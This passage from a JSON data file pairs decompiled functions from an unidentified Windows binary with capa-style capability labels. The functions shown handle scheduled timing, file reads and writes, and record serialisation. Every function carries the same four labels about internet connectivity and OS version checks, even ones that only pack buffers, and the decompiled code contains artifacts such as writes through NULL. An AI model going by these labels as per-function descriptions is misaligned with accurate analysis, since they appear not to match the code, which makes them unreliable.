        "decompiled_code": "\nuint32_t __cdecl fcn.0002dfc0(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_28h;\n    uint32_t var_24h;\n    uint8_t var_1eh;\n    uint8_t var_1dh;\n    int32_t *var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    char var_9h;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.00036320(&var_28h);\n    var_1ch = fcn.00036870(&var_28h);\n    var_24h = (0x15180 - (var_1ch[2] * 0xe10 + var_1ch[1] * 0x3c + *var_1ch)) * 1000;\n    iVar2 = fcn.000238f0(0xfffffffe, 6, &var_4h, &var_10h);\n    if (iVar2 == 0) {\n        for (var_8h = 0; var_8h < var_4h; var_8h = var_8h + 1) {\n            var_1eh = *(var_10h + 0x10 + var_8h * 0x40) >> 0x10;\n            var_1dh = *(var_10h + 0x10 + var_8h * 0x40) >> 8;\n            uVar1 = *(var_10h + 0x10 + var_8h * 0x40);\n            var_9h = uVar1;\n            var_18h = *(var_10h + 0x14 + var_8h * 0x40);\n            if ((((var_1eh < 0x18) && (var_1dh < 0x3c)) && (var_9h != '\\0')) && (var_18h != 0)) {\n                if (((1 << (var_1ch[3] & 0x1f) & var_18h) != 0) && ((1 << (var_1ch[6] & 0x1f) & uVar1 & 0xff) != 0)) {\n                    iVar2 = (var_1eh * 0x3c + var_1dh) * 0x3c;\n                    iVar3 = var_1ch[2] * 0xe10 + var_1ch[1] * 0x3c + *var_1ch;\n                    if (iVar2 - iVar3 == 0 || iVar2 < iVar3) {\n                        var_14h = (var_1ch[2] * 0xe10 + var_1ch[1] * 0x3c + *var_1ch +\n                                  (var_1eh * 0x3c + var_1dh) * -0x3c) * 1000;\n                        if (var_14h < 0x493e1) {\n                            fcn.0002e2a0(*(var_10h + 0xc + var_8h * 0x40), *(var_10h + 0x18 + var_8h * 0x40), \n                                         *(var_10h + 4 + var_8h * 0x40), *(var_10h + 0x30 + var_8h * 0x40));\n                            fcn.00023a80(*(var_10h + var_8h * 0x40), *(var_10h + 8 + var_8h * 0x40), \n                                         *(var_10h + 4 + var_8h * 0x40));\n                        }\n                    }\n                    else {\n                        var_14h = ((var_1eh * 0x3c + var_1dh) * 0x3c -\n                                  (var_1ch[2] * 0xe10 + var_1ch[1] * 0x3c + *var_1ch)) * 1000;\n                        if (var_14h < var_24h) {\n                            var_24h = var_14h;\n                        }\n                    }\n                }\n            }\n            else if (arg_8h != 0) {\n                fcn.0002e2a0(*(var_10h + 0xc + var_8h * 0x40), *(var_10h + 0x18 + var_8h * 0x40), \n                             *(var_10h + 4 + var_8h * 0x40), *(var_10h + 0x30 + var_8h * 0x40));\n                fcn.00023a80(*(var_10h + var_8h * 0x40), *(var_10h + 8 + var_8h * 0x40), *(var_10h + 4 + var_8h * 0x40))\n                ;\n            }\n        }\n        fcn.00023b90(var_10h);\n    }\n    return var_24h;\n}\n",
        "token_count": 1171
    },
    "0002e2a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0002e2a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_14h = fcn.000356c0(arg_14h);\n    if (var_14h == 0) {\n        fcn.00029dc0(7, 0, 0x21590004, arg_ch, arg_8h);\n    }\n    else {\n        var_4h = fcn.00023a30(0xfffffffe, 6, arg_10h, 0, var_14h, arg_14h, &arg_14h);\n        if (var_4h == 0) {\n            var_10h = 0x800cc628;\n            var_20h = 0;\n            var_1ch = 0;\n            var_18h._0_1_ = 0;\n            var_28h = arg_8h;\n            var_2ch = arg_ch;\n            var_24h = 3;\n            var_8h = 0;\n            var_ch = 0;\n            fcn.000271f0(&var_10h, arg_ch, var_14h, arg_14h, &var_8h, &var_ch, &var_2ch);\n            fcn.000357f0(var_14h);\n            fcn.000357f0(var_8h);\n        }\n        else {\n            fcn.00029dc0(7, 0, var_4h + 0x191U | 0x21590000, arg_ch, arg_8h);\n            fcn.000357f0(var_14h);\n        }\n    }\n    return;\n}\n",
        "token_count": 472
    },
    "0002e450": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.0002e450(uint arg_8h, uint noname_1, uint arg_10h, uint *arg_14h, int32_t *arg_18h, uint32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t var_58h;\n    uint32_t var_54h;\n    uint32_t var_50h;\n    char var_49h;\n    uint32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint32_t var_24h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int16_t *var_8h;\n    int16_t *var_4h;\n    \n    var_54h = 0;\n    var_48h = 0;\n    var_3ch = 0;\n    var_58h = -1;\n    var_44h = 0;\n    *arg_14h = 1;\n    iVar1 = fcn.00020a10(arg_10h, 3, 4, &var_8h, 0);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    var_14h = 0;\n    var_10h = 0xffffffff;\n    var_49h = '\\0';\n    fcn.00020a80(arg_10h, 7, 2, &var_14h, 4);\n    fcn.00020a80(arg_10h, 8, 2, &var_10h, 4);\n    fcn.00020a80(arg_10h, 0x15, 1, &var_49h, 1);\n    if ((*var_8h == 0x26) && (var_49h == '\\0')) {\n        var_8h = var_8h + 1;\n        var_49h = '\\x01';\n    }\n    if (arg_20h != 0) {\n        var_54h = 0x2000;\n        var_48h = 0x6000;\n        fcn.00020a80(arg_10h, 10, 2, &var_54h, 4);\n        fcn.00020a80(arg_10h, 0xb, 2, &var_48h, 4);\n        if ((var_48h == 0) || (var_48h < var_54h)) {\n            var_50h = 0x21590064;\n            goto code_r0x0002e826;\n        }\n    }\n    if (var_49h == '\\0') {\n        var_58h = fcn.00035e20(var_8h, 0);\n        if (var_58h == -1) {\n            uVar2 = fcn.00035ae0();\n            return uVar2;\n        }\n        if ((var_14h != 0) && (iVar1 = fcn.000361b0(var_58h, var_14h, 0),  iVar1 != var_14h)) {\n            var_50h = fcn.00035ae0();\n            goto code_r0x0002e826;\n        }\n        fcn.000360e0(var_58h, &var_38h);\n        var_3ch = var_24h;\n        var_40h = 0xffffffff;\n    }\n    else {\n        if (arg_20h != 0) {\n            return 0x21590001;\n        }\n        var_40h = fcn.00036400(var_8h, &var_4h, 0);\n        if (*var_4h != 0) {\n            return 0x21590065;\n        }\n        var_ch = fcn.00029500(3, var_40h, 0, 0, &var_3ch, 0);\n        if (var_ch != 0) {\n            return var_ch + 0x191U | 0x21590000;\n        }\n        var_58h = -1;\n    }\n    if (var_10h < var_3ch) {\n        var_3ch = var_10h;\n    }\n    if (arg_20h == 0) {\n        iVar1 = fcn.000356c0(var_3ch);\n        *arg_18h = iVar1;\n        if (*arg_18h == 0) {\n            var_50h = 0x21590004;\n        }\n        else {\n            if (var_58h == -1) {\n                var_ch = fcn.00029500(3, var_40h, *arg_18h, var_3ch, &var_3ch, 0);\n                if (var_ch != 0) {\n                    fcn.000357f0(*arg_18h);\n                    *arg_18h = 0;\n                    var_50h = var_ch + 0x191U | 0x21590000;\n                    goto code_r0x0002e826;\n                }\n            }\n            else {\n                var_3ch = fcn.00036010(var_58h, *arg_18h, var_3ch);\n                if (var_3ch < 0) {\n                    fcn.000357f0(*arg_18h);\n                    *arg_18h = 0;\n                    var_50h = fcn.00035ae0();\n                    goto code_r0x0002e826;\n                }\n            }\n            *arg_1ch = var_3ch;\ncode_r0x0002e81f:\n            var_50h = 0;\n        }\n    }\n    else {\n        var_44h = fcn.000356c0(var_48h);\n        if (var_44h == 0) {\n            var_50h = 0x21590004;\n        }\n        else {\n            var_3ch = fcn.00035950(var_3ch);\n            var_50h = fcn.00078000(arg_8h, &var_3ch, 4, 0);\n            while (var_50h == 0) {\n                if (var_54h < var_48h) {\n                    uVar2 = fcn.00078a6e();\n                    var_3ch = uVar2 % ((var_48h - var_54h) + 1) + var_54h;\n                }\n                else {\n                    uVar2 = fcn.00078a6e();\n                    var_3ch = uVar2 % ((var_54h - var_48h) + 1) + var_48h;\n                }\n                var_3ch = fcn.00036010(var_58h, var_44h, var_3ch);\n                if (var_3ch < 0) {\n                    var_50h = fcn.00035ae0();\n                    break;\n                }\n                if (var_3ch == 0) {\n                    var_50h = fcn.00078000(arg_8h, 0, 0, 0);\n                    if (var_50h == 0) goto code_r0x0002e81f;\n                    break;\n                }\n                var_50h = fcn.00078000(arg_8h, var_44h, var_3ch, 0);\n            }\n        }\n    }\ncode_r0x0002e826:\n    fcn.000357f0(var_44h);\n    if (var_58h != -1) {\n        fcn.00036000(var_58h);\n    }\n    return var_50h;\n}\n",
        "token_count": 1740
    },
    "0002e850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl\nfcn.0002e850(uint arg_8h, uint noname_1, uint arg_10h, uint noname_3, uint noname_4, uint noname_5, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint arg_14h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_19h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int16_t *var_8h;\n    int16_t *var_4h;\n    \n    iVar1 = fcn.00020a10(arg_10h, 3, 4, &var_8h, 0);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    var_19h._0_1_ = '\\0';\n    fcn.00020a80(arg_10h, 0x15, 1, &var_19h, 1);\n    if ((*var_8h == 0x26) && (var_19h == '\\0')) {\n        var_8h = var_8h + 1;\n        var_19h._0_1_ = '\\x01';\n    }\n    if (var_19h == '\\0') {\n        var_2ch = fcn.00035e20(var_8h, 0x301);\n        if (var_2ch == -1) {\n            uVar2 = fcn.00035ae0();\n            return uVar2;\n        }\n        stack0xffffffe4 = 0xffffffff;\n    }\n    else {\n        if (arg_20h != 0) {\n            return 0x21590001;\n        }\n        *NULL = fcn.00036400(var_8h, &var_4h, 0);\n        if (*var_4h != 0) {\n            return 0x21590065;\n        }\n        var_2ch = -1;\n    }\n    if (arg_20h == 0) {\n        iVar1 = fcn.00020a10(arg_10h, 4, 5, &var_20h, &var_14h);\n        if (iVar1 == 0) {\n            var_24h = 0x21590065;\n        }\n        else {\n            if (var_2ch == -1) {\n                var_ch = fcn.00029710(3, stack0xffffffe4, var_20h, var_14h, 0, 1);\n                if (var_ch != 0) {\n                    return var_ch + 0x191U | 0x21590000;\n                }\n            }\n            else {\n                iVar1 = fcn.00036080(var_2ch, var_20h, var_14h);\n                if (iVar1 < 0) {\n                    var_24h = fcn.00035ae0();\n                    goto code_r0x0002ea44;\n                }\n            }\ncode_r0x0002ea3d:\n            var_24h = 0;\n        }\n    }\n    else {\n        arg_14h = fcn.000298c0(400, 20000);\n        while (var_24h = fcn.00077fd0(arg_8h, &var_20h, &var_10h, arg_14h, 0),  var_24h == 0) {\n            if (var_10h == 0) goto code_r0x0002ea3d;\n            iVar1 = fcn.00036080(var_2ch, var_20h, var_10h);\n            if (iVar1 < 0) {\n                var_24h = fcn.00035ae0();\n                fcn.00077fa0(arg_8h, var_20h, 0);\n                break;\n            }\n            fcn.00077fa0(arg_8h, var_20h, 0);\n        }\n    }\ncode_r0x0002ea44:\n    if (var_2ch != -1) {\n        fcn.00036000(var_2ch);\n    }\n    return var_24h;\n}\n",
        "token_count": 970
    },
    "0002ea60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0002ea60(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_55h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_10h;\n    uint32_t var_ch;\n    int16_t *var_8h;\n    int16_t *var_4h;\n    \n    iVar1 = fcn.00020a10(arg_10h, 3, 4, &var_8h, 0);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    var_55h._0_1_ = '\\0';\n    fcn.00020a80(arg_10h, 0x15, 1, &var_55h, 1);\n    if ((*var_8h == 0x26) && (var_55h == '\\0')) {\n        var_8h = var_8h + 1;\n        var_55h._0_1_ = '\\x01';\n    }\n    if (var_55h == '\\0') {\n        iVar1 = fcn.00036210(var_8h);\n        if (iVar1 < 0) {\n            uVar2 = fcn.00035ae0();\n            return uVar2;\n        }\n    }\n    else {\n        *NULL = fcn.00036400(var_8h, &var_4h, 0);\n        if (*var_4h != 0) {\n            return 0x21590065;\n        }\n        var_ch = fcn.00029490(&var_10h);\n        if (var_ch != 0) {\n            return var_ch;\n        }\n        var_ch = fcn.00023930(var_10h, 3, &var_55h + 1, &var_50h);\n        if (var_ch != 0) {\n            return var_ch + 0x191 | 0x21590000;\n        }\n        iVar1 = fcn.00023a80(var_10h, 3, var_4ch);\n        if (iVar1 != 0) {\n            return iVar1 + 0x191U | 0x21590000;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 531
    },
    "0002eb80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0002eb80(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    int32_t *var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    *arg_14h = 3;\n    var_ch = 0;\n    var_8h = 0;\n    var_14h = 2;\n    var_10h = &var_2ch;\n    var_2ch = 6;\n    uStack44 = 2;\n    uStack40 = 7;\n    uStack36 = 4;\n    var_34h = fcn.00034cf0(5, &var_4h);\n    if (var_34h == 0) {\n        var_30h = 0;\n        for (var_1ch = var_4h; var_30h = var_30h + 1,  *var_1ch != 0; var_1ch = var_1ch + *var_1ch) {\n        }\n        var_ch = var_30h;\n        var_8h = fcn.000357b0(var_30h, 4);\n        if (var_8h == 0) {\n            var_34h = 0x21590004;\n        }\n        else {\n            var_1ch = var_4h;\n            for (var_18h = 0; var_18h < var_30h; var_18h = var_18h + 1) {\n                uVar1 = fcn.000356c0(var_14h * 0x10 + 2 + *(var_1ch + 0xe));\n                *(var_8h + var_18h * 4) = uVar1;\n                if (*(var_8h + var_18h * 4) == 0) {\n                    var_34h = 0x21590004;\n                    goto code_r0x0002ed8f;\n                }\n                fcn.00078bfa(*(var_8h + var_18h * 4), 0, var_14h << 4);\n                *(*(var_8h + var_18h * 4) + 4) = *(var_8h + var_18h * 4) + 8;\n                **(var_8h + var_18h * 4) = 4;\n                **(*(var_8h + var_18h * 4) + 4) = var_1ch[0x11];\n                *(*(var_8h + var_18h * 4) + 0x14) = *(var_8h + var_18h * 4) + 0x20;\n                *(*(var_8h + var_18h * 4) + 0x10) = *(var_1ch + 0xe) + 2;\n                fcn.00078be8(*(*(var_8h + var_18h * 4) + 0x14), var_1ch[0xf], *(var_1ch + 0xe));\n                *(*(var_1ch + 0xe) + *(*(var_8h + var_18h * 4) + 0x14)) = 0;\n                var_1ch = var_1ch + *var_1ch;\n            }\n            var_34h = fcn.0002f2c0(&var_14h, arg_18h, arg_1ch);\n        }\n    }\ncode_r0x0002ed8f:\n    if (var_8h != 0) {\n        for (var_18h = 0; var_18h < var_ch; var_18h = var_18h + 1) {\n            fcn.000357f0(*(var_8h + var_18h * 4));\n        }\n    }\n    fcn.000357f0(var_8h);\n    fcn.000357f0(var_4h);\n    return var_34h;\n}\n",
        "token_count": 1014
    },
    "0002edf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0002edf0(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00020a80(arg_10h, 2, 2, &var_10h, 4);\n    if (iVar1 == 0) {\n        var_ch = 0x21590065;\n    }\n    else {\n        var_8h = var_10h;\n        var_4h = 0;\n        var_2ch = 0;\n        var_28h = 0;\n        var_24h = 0;\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h = 0;\n        var_ch = fcn.0001d570(&var_14h, 1, &var_2ch, &var_8h);\n        if (var_ch == 0) {\n            var_ch = fcn.0001d5e0(var_14h, 0);\n            fcn.000789b4(var_14h);\n        }\n        else {\n            var_ch = fcn.00078a2c(var_ch);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 355
    },
    "0002ee80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0002ee80(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    uint var_280h;\n    uint var_278h;\n    int16_t *var_274h;\n    uint var_270h;\n    uint var_268h;\n    uint *var_264h;\n    uint var_260h;\n    uint var_258h;\n    int16_t *var_254h;\n    uint var_250h;\n    uint var_248h;\n    uint *var_244h;\n    uint var_23ch;\n    uint *var_238h;\n    int16_t *var_234h;\n    uint var_230h;\n    uint *var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint *var_21ch;\n    int32_t var_1f0h;\n    uint *var_1ech;\n    int32_t var_1e0h;\n    uint var_1dch;\n    char *var_1d0h;\n    uint *var_1cch;\n    int32_t var_1c0h;\n    int32_t var_1bch;\n    int32_t var_1b0h;\n    uint var_1ach;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_18ch;\n    uint32_t var_188h;\n    int32_t var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint *var_150h;\n    uint var_14ch;\n    int32_t var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_78h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    *arg_14h = 3;\n    fcn.00078bfa(&var_228h, 0, 0x38);\n    var_22ch = &var_140h;\n    var_230h._0_2_ = 0;\n    var_230h._2_2_ = 200;\n    var_224h = 0x24;\n    var_220h = 0x800546dc;\n    var_21ch = &var_230h;\n    var_148h = fcn.00078aec(2, 0x800546f8, &var_228h, 0, 0);\n    if (var_148h != 0) {\n        var_234h = 0x8005473c;\n        var_238h = &var_140h;\n        do {\n            iVar2 = *var_234h;\n            *var_238h = iVar2;\n            var_234h = var_234h + 1;\n            var_238h = var_238h + 2;\n        } while (iVar2 != 0);\n    }\n    var_18ch = 0;\n    var_14ch = 0;\n    var_144h = 0;\n    var_188h = 0;\n    var_184h = 0;\n    fcn.00078af2(&var_18ch, &var_14ch, &var_144h, &var_188h);\n    var_10h = 6;\n    var_ch = &var_180h;\n    var_150h = &var_1f0h;\n    var_8h = 1;\n    var_4h = &var_150h;\n    var_180h = 9;\n    var_17ch = 4;\n    var_1ech = &var_140h;\n    var_244h = &var_140h;\n    do {\n        iVar2 = *var_244h;\n        var_244h = var_244h + 2;\n    } while (iVar2 != 0);\n    var_1f0h = (var_244h - (&var_140h + 2) >> 1) * 2 + 2;\n    var_178h = 10;\n    var_174h = 4;\n    var_1dch = 0x80054744;\n    var_254h = 0x80054744;\n    piVar3 = var_254h;\n    do {\n        var_254h = piVar3;\n        piVar3 = var_254h + 1;\n    } while (*var_254h != 0);\n    var_1e0h = (var_254h + 0x3ffd5c5e >> 1) * 2 + 2;\n    var_170h = 0xb;\n    var_16ch = 200;\n    fcn.00078ad4(&var_78h, 0x80054750, var_18ch, var_14ch, var_144h);\n    var_1cch = &var_78h;\n    var_264h = &var_78h;\n    do {\n        cVar1 = *var_264h;\n        var_264h = var_264h + 1;\n    } while (cVar1 != '\\0');\n    var_1d0h = var_264h + (1 - (&var_78h + 1));\n    var_168h = 0xc;\n    var_164h = 4;\n    if (var_184h == 0) {\n        var_1bch = -0x7ffab89c;\n        var_1c0h = 2;\n    }\n    else {\n        var_1bch = var_184h;\n        var_1c0h = (var_188h & 0xffff) + 2;\n    }\n    var_160h = 0xd;\n    var_15ch = 4;\n    var_1ach = 0x80054768;\n    var_274h = 0x80054768;\n    piVar3 = var_274h;\n    do {\n        var_274h = piVar3;\n        piVar3 = var_274h + 1;\n    } while (*var_274h != 0);\n    var_1b0h = (var_274h + 0x3ffd5c4c >> 1) * 2 + 2;\n    var_158h = 0x88;\n    var_154h = 4;\n    var_19ch = 0x800cbb60;\n    var_1a0h = 0x1e;\n    fcn.0002f2c0(&var_10h, arg_18h, arg_1ch);\n    return;\n}\n",
        "token_count": 1600
    },
    "0002f2c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0002f2c0(uint32_t *arg_8h, uint32_t **arg_ch, int32_t *arg_10h)\n\n{\n    uint32_t *arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    for (var_8h = 0; var_8h < arg_8h[2]; var_8h = var_8h + 1) {\n        for (var_1ch = 0; var_1ch < *arg_8h; var_1ch = var_1ch + 1) {\n            if (*(arg_8h[1] + 4 + var_1ch * 8) == 200) {\n                var_10h = var_10h + 4 + *(*(arg_8h[3] + var_8h * 4) + var_1ch * 0x10) * 2;\n            }\n            else {\n                var_10h = var_10h + 4 + *(*(arg_8h[3] + var_8h * 4) + var_1ch * 0x10);\n            }\n        }\n    }\n    arg_8h_00 = fcn.000356c0(*arg_8h * 0x11 + 0x14 + var_10h);\n    if (arg_8h_00 == NULL) {\n        uVar1 = 0x21590004;\n    }\n    else {\n        *arg_8h_00 = 0;\n        arg_8h_00[1] = 0;\n        arg_8h_00[2] = 0;\n        arg_8h_00[3] = 0;\n        arg_8h_00[4] = 0;\n        *arg_8h_00 = *arg_8h;\n        arg_8h_00[1] = arg_8h[2];\n        fcn.000270a0(arg_8h_00);\n        puVar3 = arg_8h_00 + 5;\n        fcn.00078bfa(puVar3, 0, *arg_8h * 0x11);\n        for (var_8h = 0; var_8h < *arg_8h; var_8h = var_8h + 1) {\n            *(puVar3 + var_8h * 0x11) = *(arg_8h[1] + var_8h * 8);\n            *(arg_8h_00 + var_8h * 0x11 + 0x18) = *(arg_8h[1] + 4 + var_8h * 8);\n            if ((*(arg_8h_00 + var_8h * 0x11 + 0x18) == -0x38) || (*(arg_8h_00 + var_8h * 0x11 + 0x18) == -0x37)) {\n                *(arg_8h_00 + var_8h * 0x11 + 0x18) = 4;\n            }\n            fcn.0002f2a0(var_8h * 0x11 + puVar3);\n        }\n        var_ch = *arg_8h * 0x11 + 0x14;\n        for (var_8h = 0; var_8h < arg_8h[2]; var_8h = var_8h + 1) {\n            for (var_1ch = 0; var_1ch < *arg_8h; var_1ch = var_1ch + 1) {\n                if (*(arg_8h[1] + 4 + var_1ch * 8) == 200) {\n                    if ((*(var_1ch * 0x10 + *(arg_8h[3] + var_8h * 4)) == 0) ||\n                       (*(*(arg_8h[3] + var_8h * 4) + 4 + var_1ch * 0x10) == 0)) {\n                        *(arg_8h_00 + var_ch) = 0;\n                        var_ch = var_ch + 4;\n                    }\n                    else {\n                        iVar2 = fcn.000379d0(*(*(arg_8h[3] + var_8h * 4) + 4 + var_1ch * 0x10));\n                        uVar1 = fcn.00035950(iVar2 * 2);\n                        *(arg_8h_00 + var_ch) = uVar1;\n                        fcn.00037880(*(*(arg_8h[3] + var_8h * 4) + 4 + var_1ch * 0x10), arg_8h_00 + var_ch + 4, \n                                     0xffffffff);\n                        var_ch = var_ch + 4 + iVar2 * 2;\n                    }\n                }\n                else {\n                    uVar1 = fcn.00035950(*(*(arg_8h[3] + var_8h * 4) + var_1ch * 0x10));\n                    *(arg_8h_00 + var_ch) = uVar1;\n                    fcn.00078be8(arg_8h_00 + var_ch + 4, *(*(arg_8h[3] + var_8h * 4) + 4 + var_1ch * 0x10), \n                                 *(*(arg_8h[3] + var_8h * 4) + var_1ch * 0x10));\n                    fcn.00020af0(*(arg_8h[1] + 4 + var_1ch * 8));\n                    var_ch = var_ch + 4 + *(*(arg_8h[3] + var_8h * 4) + var_1ch * 0x10);\n                }\n            }\n        }\n        *arg_ch = arg_8h_00;\n        *arg_10h = *arg_8h * 0x11 + 0x14 + var_10h;\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 1473
    },
    "0002f6b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0002f6b0(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = NULL;\n    while( true ) {\n        if (arg_ch < 0x15) {\n            return var_1ch;\n        }\n        var_18h = *arg_8h;\n        var_14h = arg_8h[1];\n        var_10h = arg_8h[2];\n        var_ch = arg_8h[3];\n        var_8h = arg_8h[4];\n        var_4h._0_1_ = *(arg_8h + 5);\n        fcn.000270a0(&var_18h);\n        if (arg_ch - 0x15 < var_14h) break;\n        puVar1 = fcn.000356c0(0x1c);\n        if (puVar1 == NULL) {\n            return var_1ch;\n        }\n        *puVar1 = 0;\n        puVar1[1] = 0;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        puVar1[1] = var_18h;\n        puVar1[2] = var_10h & 0xff;\n        puVar1[3] = var_14h;\n        if (puVar1[3] < 8) {\n            puVar1[4] = puVar1 + 5;\n        }\n        else {\n            uVar2 = fcn.000356c0(puVar1[3]);\n            puVar1[4] = uVar2;\n            if (puVar1[4] == 0) {\n                puVar1[3] = 0;\n            }\n        }\n        fcn.00078be8(puVar1[4], arg_8h + 0x15, var_14h);\n        arg_8h = arg_8h + 0x15 + var_14h;\n        arg_ch = (arg_ch - 0x15) - var_14h;\n        arg_8h_00 = puVar1[2];\n        iVar3 = fcn.00020af0(arg_8h_00);\n        if (iVar3 == 0) {\n            arg_8h_00[3] = 0;\n        }\n        *arg_8h_00 = var_1ch;\n        var_1ch = arg_8h_00;\n    }\n    return var_1ch;\n}\n",
        "token_count": 712
    },
    "0002f810": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
